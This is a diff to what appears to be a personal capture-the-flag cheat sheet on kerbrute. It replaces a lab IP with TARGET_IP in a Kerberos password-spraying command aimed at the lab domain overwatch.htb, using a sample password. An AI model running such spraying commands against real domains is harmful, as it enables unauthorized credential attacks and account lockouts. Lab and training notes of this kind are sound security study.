@@ -6,7 +6,7 @@ Go tool for Kerberos pre-authentication based user enumeration and password spra
 
 ### Password spraying via AS-REQ
 ```bash
-kerbrute passwordspray -d overwatch.htb --dc 10.129.28.165 users.txt 'TI0LKcfHzZw1Vv'
+kerbrute passwordspray -d overwatch.htb --dc TARGET_IP users.txt 'TI0LKcfHzZw1Vv'
 ```
 Used on: **Overwatch**
 
